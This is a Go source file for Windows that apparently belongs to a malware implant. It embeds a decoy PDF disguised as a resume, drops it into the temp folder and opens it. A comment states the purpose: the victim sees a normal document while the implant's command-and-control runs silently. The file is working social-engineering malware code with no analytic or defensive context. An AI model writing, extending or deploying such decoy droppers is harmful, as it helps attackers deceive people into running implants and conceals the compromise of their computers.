//go:build windows

package main

import (
	_ "embed"
	"os"
	"os/exec"
	"path/filepath"
)

//go:embed decoy.pdf
var decoyPDF []byte

// DropAndOpenPDF writes the embedded decoy PDF to temp and opens it with default handler.
// The victim sees a normal PDF while the implant C2 runs silently.
func DropAndOpenPDF() {
	if len(decoyPDF) == 0 {
		return
	}

	tmpPath := filepath.Join(os.TempDir(), "简历.PDF")
	if err := os.WriteFile(tmpPath, decoyPDF, 0644); err != nil {
		return
	}

	cmd := exec.Command("cmd", "/c", "start", "", tmpPath)
	cmd.Dir = os.TempDir()
	cmd.Start()
}
